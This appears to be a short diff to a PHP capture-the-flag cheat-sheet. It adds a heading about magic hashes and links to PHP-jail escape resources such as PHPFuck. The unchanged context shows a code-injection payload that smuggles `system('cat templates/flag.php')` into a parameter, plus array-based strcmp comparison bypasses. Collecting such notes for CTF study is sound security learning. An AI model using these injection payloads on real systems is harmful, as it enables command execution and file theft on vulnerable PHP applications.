@@ -18,7 +18,7 @@
 flag','..')+or+system('cat+templates/flag.php');//
 ```
 
-# type juggling, weak comparison
+# type juggling, weak comparison, magic hashes
 
 ```php
 <?php
@@ -28,3 +28,10 @@ strcmp($_GET['user'], "admin") == 0
 strcasecmp($_GET['secret'], "0x1337") == 0
 // => ["1"]
 ```
+
+# jail
+
+[GitHub \- splitline/PHPFuck: PHPFuck: \(\(\+\.^\)\) / Using only 7 different characters to write and execute php\.](https://github.com/splitline/PHPFuck)
+https://github.com/terjanq/Flag-Capture/blob/master/MeePwn%202018/omega/README.md#part2
+https://gist.github.com/terjanq/aa39a5a40b8d9b8a8e2a54e747715a2c
+    https://twitter.com/terjanq/status/1257276298550001664
